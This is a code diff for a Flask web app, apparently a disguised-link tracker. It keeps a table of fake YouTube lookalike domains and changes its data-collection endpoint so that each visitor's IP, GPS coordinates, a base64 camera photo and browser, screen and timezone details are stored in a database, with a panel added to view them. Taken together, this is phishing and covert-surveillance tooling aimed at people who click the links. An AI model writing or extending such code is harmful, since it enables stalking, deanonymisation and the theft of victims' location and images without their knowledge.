@@ -7,6 +7,7 @@ from flask import Flask, request, render_template, jsonify, redirect, url_for, s
 from functools import wraps
 from flask_migrate import Migrate
 import os
+import re
 
 DOMINIOS_FALSOS = {
     "youtube": ["youtube.c0m.lat", "y0utube.com.br", "you-tube.video"],
@@ -90,16 +91,22 @@ class Link(db.Model):
     og_image = db.Column(db.String(300))
     
 # Tabela de acessos
-class Acesso(db.Model):
+class RegistroAcesso(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     slug = db.Column(db.String(100))
     ip = db.Column(db.String(100))
-    user_agent = db.Column(db.String(300))
     latitude = db.Column(db.String(50))
     longitude = db.Column(db.String(50))
     foto_base64 = db.Column(db.Text)
-    data = db.Column(db.DateTime, default=datetime.now)
-    
+    sistema = db.Column(db.String(100))
+    navegador = db.Column(db.String(200))
+    idioma = db.Column(db.String(50))
+    fuso_horario = db.Column(db.String(100))
+    conexao = db.Column(db.String(100))
+    largura_tela = db.Column(db.String(20))
+    altura_tela = db.Column(db.String(20))
+    tempo_segundos = db.Column(db.Integer)
+    data_hora = db.Column(db.DateTime, default=datetime.utcnow)
 
 # Tabela de registros (IP e User-Agent)
 class Registro(db.Model):
@@ -196,36 +203,82 @@ def buscar_destino_por_slug(slug):
     return "Destino não encontrado"
 
 # Coleta dados de IP, localização e foto
+
+
+def analisar_user_agent(user_agent):
+    dispositivo = "Desconhecido"
+    sistema = "Desconhecido"
+    navegador = "Desconhecido"
+
+    # Detecta sistema operacional
+    if "Android" in user_agent:
+        sistema_match = re.search(r"Android\s[\d\.]+", user_agent)
+        sistema = sistema_match.group(0) if sistema_match else "Android"
+        dispositivo_match = re.search(r";\s?([^;]*)\sBuild", user_agent)
+        dispositivo = dispositivo_match.group(1).strip() if dispositivo_match else "Android genérico"
+    elif "iPhone" in user_agent:
+        sistema = "iOS"
+        dispositivo = "iPhone"
+    elif "iPad" in user_agent:
+        sistema = "iOS"
+        dispositivo = "iPad"
+    elif "Windows" in user_agent:
+        sistema_match = re.search(r"Windows NT [\d\.]+", user_agent)
+        sistema = sistema_match.group(0).replace("Windows NT", "Windows") if sistema_match else "Windows"
+        dispositivo = "PC"
+    elif "Macintosh" in user_agent:
+        sistema = "MacOS"
+        dispositivo = "Mac"
+
+    # Detecta navegador
+    if "Chrome" in user_agent and "Safari" in user_agent:
+        navegador_match = re.search(r"Chrome\/[\d\.]+", user_agent)
+        navegador = navegador_match.group(0) if navegador_match else "Chrome"
+    elif "Safari" in user_agent and not "Chrome" in user_agent:
+        navegador_match = re.search(r"Version\/[\d\.]+ Safari", user_agent)
+        navegador = navegador_match.group(0) if navegador_match else "Safari"
+    elif "Firefox" in user_agent:
+        navegador_match = re.search(r"Firefox\/[\d\.]+", user_agent)
+        navegador = navegador_match.group(0) if navegador_match else "Firefox"
+    elif "Edg" in user_agent:
+        navegador_match = re.search(r"Edg\/[\d\.]+", user_agent)
+        navegador = navegador_match.group(0) if navegador_match else "Edge"
+
+    return {
+        "sistema": sistema,
+        "dispositivo": dispositivo,
+        "navegador": navegador
+    }
+
 @app.route("/coletar_dados", methods=["POST"])
 def coletar_dados():
-    data = request.get_json()
+    dados = request.get_json()
 
-    slug = data.get("slug")
-    latitude = data.get("latitude")
-    longitude = data.get("longitude")
-    foto_base64 = data.get("foto_base64")
+    novo_registro = RegistroAcesso(
+        slug=dados.get("slug"),
+        ip=request.headers.get('X-Forwarded-For', request.remote_addr),
+        latitude=dados.get("latitude"),
+        longitude=dados.get("longitude"),
+        foto_base64=dados.get("foto_base64"),
+        sistema=dados.get("plataforma"),
+        navegador=dados.get("userAgent"),
+        idioma=dados.get("idioma"),
+        fuso_horario=dados.get("fusoHorario"),
+        conexao=dados.get("conexao"),
+        largura_tela=dados.get("larguraTela"),
+        altura_tela=dados.get("alturaTela"),
+        tempo_segundos=dados.get("tempoSegundos")
+    )
 
-    # IP capturado diretamente do request
-    ip_usuario = request.headers.get('X-Forwarded-For', request.remote_addr)
+    db.session.add(novo_registro)
+    db.session.commit()
 
-    # Log para debug ou persistência
-    print("📥 Dados recebidos:")
-    print("Slug:", slug)
-    print("IP:", ip_usuario)
-    print("Latitude:", latitude)
-    print("Longitude:", longitude)
-    print("Foto base64:", "SIM" if foto_base64 else "NÃO")
-    print("Timestamp:", datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
-
-    # Aqui você pode salvar os dados no banco, por exemplo:
-    # salvar_no_banco(slug, ip_usuario, latitude, longitude, foto_base64)
-
-    return jsonify({ "status": "ok", "destino": buscar_destino_por_slug(slug) })
+    return jsonify({ "status": "ok", "destino": buscar_destino_por_slug(dados.get("slug")) })
 
 # Painel para visualizar os acessos
 @app.route("/painel")
 def painel():
-    registros = Registro.query.order_by(Registro.timestamp.desc()).all()
+    registros = RegistroAcesso.query.order_by(RegistroAcesso.data_hora.desc()).all()
 
     # Carregar todos os links, organizando por slug
     todos_links = Link.query.all()
